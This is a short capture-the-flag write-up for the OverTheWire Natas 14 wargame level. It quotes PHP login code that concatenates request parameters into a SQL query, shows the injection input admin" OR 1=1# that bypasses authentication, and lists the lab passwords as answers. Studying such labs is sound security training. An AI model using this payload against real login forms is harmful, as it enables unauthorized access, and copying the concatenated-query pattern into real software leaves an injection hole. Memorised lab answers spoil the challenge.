# Natas 13 - Natas 14
    Username  : natas14
    Password  : z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
    URL       : http://natas14.natas.labs.overthewire.org

# Solution
While looking at the source code we found that 
```
<? 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
            echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
            echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
} else { 
?>
```
This can be an classic example of sql injection

Here we got an SQL Injection, if you check the query you can see that we can easly bypass the authentication :

    SELECT * from users where username="user" and password="pass"

If we put admin” OR 1=1# into the username field, you can see that we succesfully take over the logic of the query and force it to return true (the # will make sure that remaining of the query will be passed as comment) 

    SELECT * from users where username="admin" OR 1=1# " and password="pass"

# Password
    SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
